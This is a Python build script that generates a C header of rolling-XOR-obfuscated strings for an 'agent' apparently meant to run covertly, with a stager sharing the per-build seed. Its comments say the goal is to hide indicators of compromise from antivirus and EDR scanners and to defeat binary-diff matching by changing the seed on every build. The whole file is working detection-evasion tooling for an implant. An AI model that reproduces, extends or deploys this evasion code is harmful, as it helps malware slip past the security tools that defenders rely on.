#!/usr/bin/env python3
"""
gen_agent_str.py — Build-time string obfuscation generator for the agent
=========================================================================

PURPOSE
-------
This script reads a plain-text file (``obf_agent_msgs.txt``) that lists
every human-readable string the agent needs at runtime (error messages,
protocol tokens, etc.), encodes them all with a random key, and writes
a C header (``obf_agent_strings.h``) that the agent's C source includes.

WHY OBFUSCATE STRINGS?
-----------------------
Antivirus engines and EDR (Endpoint Detection and Response) tools scan
binaries for recognisable strings.  If the binary contains the literal
text "ERR: fork" or "syscron OK", those become IOCs (Indicators of
Compromise) that can identify the agent.  By encoding all strings before
compilation, the plaintext never appears in the compiled binary.

HOW THE ENCODING WORKS — "ROLLING XOR"
----------------------------------------
A simple XOR (each byte XOR'd with the same constant) is easy to break:
an analyst who sees many bytes XOR'd with the same value can guess the
key quickly.

Rolling XOR is harder:
  1. Start with a seed byte ``k`` (chosen randomly each build).
  2. XOR the first input byte with ``k``.
  3. Update the key: k = (k * 13 + 7) & 0xFF   <-- key changes every step
  4. XOR the second input byte with the NEW k.
  5. Repeat.

Because the key changes with every byte, different positions in the same
string are encoded with different values.  This defeats simple frequency
analysis.

The same algorithm run in reverse decodes the string, because XOR is
its own inverse: (byte ^ k) ^ k == byte.

SINGLE BLOB DESIGN
-------------------
Instead of one C array per string, all encoded strings are packed into
a single byte array called OBF_MSGS_DATA.  Two companion arrays store:
  - OBF_MSGS_OFFSETS[i] : byte offset where string i starts in the blob
  - OBF_MSGS_LENS[i]    : byte length of string i

At runtime the agent calls get_obf_msg(idx, buf) which:
  1. Looks up the offset and length for string ``idx``.
  2. Re-runs the rolling XOR starting from OBF_AGENT_SEED to decode
     exactly those bytes into a temporary buffer.
  3. Returns — the plaintext exists in RAM only for the duration of use.

PER-BUILD SEED
--------------
The seed is chosen at random (1-255) each time the Makefile runs this
script.  Two builds of the same source produce different binary blobs
with different encoded bytes.  This defeats "binary diff" IOC matching:
two captures of the same agent look different to a scanner even though
the source code is identical.

Usage: python3 gen_agent_str.py [msgs_file] [output_header]
"""
import argparse
import os
import secrets
import sys


def rolling_xor_encode(data: bytes, seed: int) -> list[int]:
    """
    Encode a byte sequence with rolling XOR.

    Parameters
    ----------
    data : raw bytes to encode (e.g. b"ERR: fork")
    seed : starting key byte (1-255)

    Returns
    -------
    List of encoded integer byte values.

    Algorithm:
        k = seed
        for each byte b in data:
            encoded_byte = b XOR k
            k = (k * 13 + 7) & 0xFF   # advance key for next byte

    The constants 13 and 7 are a simple linear congruential step that
    spreads the key values across the 0-255 range in a non-trivial
    pattern, making it harder to spot the encoding by eye.
    """
    out, k = [], seed   # start the rolling key at the seed value
    for b in data:
        out.append(b ^ k)                  # XOR this byte with the current key
        k = (k * 13 + 7) & 0xFF           # advance the key (& 0xFF keeps it a single byte)
    return out


def main():
    parser = argparse.ArgumentParser(
        description="Build-time rolling-XOR obfuscation generator for the agent's string table.",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog=(
            "Reads a plain-text file with one string per line (blank lines and\n"
            "lines starting with '#' are skipped), encodes every string with a\n"
            "random rolling-XOR key, and writes a C header containing the encoded\n"
            "blob plus a decode macro. Called by the Makefile."
        ),
    )
    parser.add_argument(
        "msgs", nargs="?", default="obf_agent_msgs.txt", metavar="msgs.txt",
        help="input file: one plaintext string per line (default: obf_agent_msgs.txt)",
    )
    parser.add_argument(
        "output", nargs="?", default="obf_agent_strings.h", metavar="output.h",
        help="output C header path (default: obf_agent_strings.h)",
    )
    a = parser.parse_args()
    MSGS_FILE   = a.msgs
    OUTPUT_FILE = a.output

    # ── Read the message list ──────────────────────────────────────────────────
    if not os.path.exists(MSGS_FILE):
        print(f"[gen_agent_str] '{MSGS_FILE}' not found", file=sys.stderr)
        sys.exit(1)

    with open(MSGS_FILE, encoding="utf-8") as f:
        # Strip whitespace, skip blank lines and comment lines (starting with #).
        # l.strip() is used for the startswith check so leading spaces before '#'
        # are handled correctly (a line "  # comment" must also be skipped).
        msgs = [l.strip() for l in f if l.strip() and not l.strip().startswith("#")]

    if not msgs:
        print("[gen_agent_str] no messages found", file=sys.stderr)
        sys.exit(1)

    # ── Pick a random seed ─────────────────────────────────────────────────────
    # 0 is excluded: XOR with 0 is a no-op (b ^ 0 == b), which would leave the
    # first byte of every string in plaintext.
    seed = secrets.randbelow(255) + 1   # [1, 255] — cryptographically random
    print(f"[gen_agent_str] seed=0x{seed:02X}  {len(msgs)} messages  output={OUTPUT_FILE}")

    # ── Encode all messages and record their positions in the blob ─────────────
    # Each message is encoded independently starting from the same seed.
    # This means the rolling XOR key resets to ``seed`` at the beginning of
    # every message.  That makes runtime decoding easy: to decode message i,
    # read OBF_MSGS_DATA + OBF_MSGS_OFFSETS[i] and run rolling XOR from seed.
    blob_bytes: list[int] = []   # the single flat array of all encoded bytes
    offsets: list[int]    = []   # where each message starts inside blob_bytes
    lengths: list[int]    = []   # how many bytes each message occupies

    for msg in msgs:
        raw = msg.encode("utf-8")              # convert Python str to raw bytes
        enc = rolling_xor_encode(raw, seed)    # encode with rolling XOR (key resets per message)
        offsets.append(len(blob_bytes))        # record the start offset before appending
        lengths.append(len(raw))              # record the original (decoded) length
        blob_bytes.extend(enc)                 # append the encoded bytes to the flat blob

    # ── Assemble the C header ──────────────────────────────────────────────────
    lines = []
    lines.append("/*")
    lines.append(f" * obf_agent_strings.h — AUTO-GENERATED by gen_agent_str.py")
    lines.append(f" * seed=0x{seed:02X}, {len(msgs)} messages — DO NOT EDIT")
    lines.append(" */")
    lines.append("")
    lines.append("#pragma once")          # guard against double-inclusion
    lines.append("#include <stdint.h>")   # for uint8_t, uint16_t
    lines.append("#include <stddef.h>")   # for size_t
    lines.append("")

    # ── Inline decode function ─────────────────────────────────────────────────
    # This tiny C function is placed directly in the header (``static inline``)
    # so the compiler can inline it at every call site — no separate .c file
    # needed and no exported symbol for the linker to expose.
    #
    # Parameters:
    #   out : destination buffer (must hold at least len+1 bytes for the '\0')
    #   enc : pointer to encoded bytes inside OBF_MSGS_DATA
    #   len : number of bytes to decode
    #   s   : seed (pass OBF_AGENT_SEED)
    lines.append("/* Rolling XOR decode — same seed as the stager for this build */")
    lines.append("static inline void _agent_str_decode(char *out, const uint8_t *enc,")
    lines.append("                                       size_t len, uint8_t s){")
    lines.append("    uint8_t k=s;")   # initialise rolling key to the seed
    lines.append("    for(size_t i=0;i<len;i++){out[i]=(char)(enc[i]^k);k=(uint8_t)((k*13+7)&0xFF);}")
    lines.append("    out[len]='\\0';}") # null-terminate the decoded string
    lines.append("")
    # OBF_AGENT_SEED is the seed baked into this specific build.
    lines.append(f"#define OBF_AGENT_SEED    0x{seed:02X}u")
    # OBF_MSGS_COUNT lets C code bounds-check index values.
    lines.append(f"#define OBF_MSGS_COUNT    {len(msgs)}u")
    lines.append("")

    # ── The encoded blob ───────────────────────────────────────────────────────
    # All encoded messages concatenated into a single read-only C array.
    # Splitting them into separate arrays would give analysts clear boundaries
    # between strings; packing them together obscures those boundaries.
    arr = ", ".join(f"0x{b:02X}" for b in blob_bytes)
    lines.append(f"static const uint8_t  OBF_MSGS_DATA[]    = {{{arr}}};")

    # ── Offset table ───────────────────────────────────────────────────────────
    # uint16_t supports up to 65535, which is large enough for any realistic
    # blob that a single agent build would need.
    offs_arr = ", ".join(str(o) for o in offsets)
    lines.append(f"static const uint16_t OBF_MSGS_OFFSETS[] = {{{offs_arr}}};")

    # ── Length table ───────────────────────────────────────────────────────────
    # uint8_t (max 255) is enough since individual messages are never longer
    # than 255 bytes in this protocol.
    lens_arr = ", ".join(str(l) for l in lengths)
    lines.append(f"static const uint8_t  OBF_MSGS_LENS[]    = {{{lens_arr}}};")
    lines.append("")

    # ── Convenience accessor macro ─────────────────────────────────────────────
    # get_obf_msg(idx, buf) is the public API that agent.c calls.
    # ``buf`` must be at least max(OBF_MSGS_LENS)+1 bytes long to hold the
    # longest possible decoded message plus the null terminator.
    lines.append("/* get_obf_msg(idx, buf)  — buf must be >= max(OBF_MSGS_LENS)+1 bytes */")
    lines.append("static inline void get_obf_msg(unsigned idx, char *buf){")
    lines.append("    if(idx>=OBF_MSGS_COUNT){buf[0]='\\0';return;}")  # bounds check: return empty string for bad index
    lines.append("    _agent_str_decode(buf,")
    lines.append("                      OBF_MSGS_DATA + OBF_MSGS_OFFSETS[idx],")  # pointer to this message's encoded bytes
    lines.append("                      OBF_MSGS_LENS[idx],")                      # number of bytes to decode
    lines.append("                      OBF_AGENT_SEED);}")                        # seed baked in at compile time
    lines.append("")

    # ── Write the file ─────────────────────────────────────────────────────────
    with open(OUTPUT_FILE, "w", encoding="utf-8") as f:
        f.write("\n".join(lines) + "\n")

    max_len = max(lengths)   # largest decoded message; callers need a buffer at least this big (+1 for '\0')
    print(f"[gen_agent_str] blob={len(blob_bytes)} bytes, max_msg_len={max_len}")


if __name__ == "__main__":
    main()
